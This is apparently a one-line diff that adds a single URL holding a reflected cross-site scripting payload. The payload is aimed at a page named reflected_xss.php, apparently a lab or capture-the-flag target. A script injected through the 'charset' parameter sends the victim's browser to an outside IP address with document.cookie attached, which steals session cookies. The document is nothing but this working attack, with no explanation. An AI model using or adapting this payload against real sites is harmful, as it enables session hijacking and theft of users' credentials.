@@ -1,0 +1,1 @@
+http://web.djosix.com:15105/reflected_xss.php?charset=utf-8"><script>window.location.href="http://140.113.68.171:8000/"%2Bdocument.cookie</script>
